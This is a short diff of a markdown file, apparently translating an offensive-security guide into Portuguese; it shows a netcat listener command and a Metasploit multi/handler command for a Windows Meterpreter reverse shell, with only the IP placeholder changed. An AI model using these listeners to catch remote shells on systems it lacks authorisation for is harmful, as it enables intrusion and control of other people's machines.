@@ -16,7 +16,7 @@ nc -lvnp 4444
 ```
 
 ```
-msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP_ADDRESS>; set lport 4444; set ExitOnSession false; exploit -j"
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost <ENDEREÇO_IP>; set lport 4444; set ExitOnSession false; exploit -j"
 ```
 
 **Testado em:**<br>
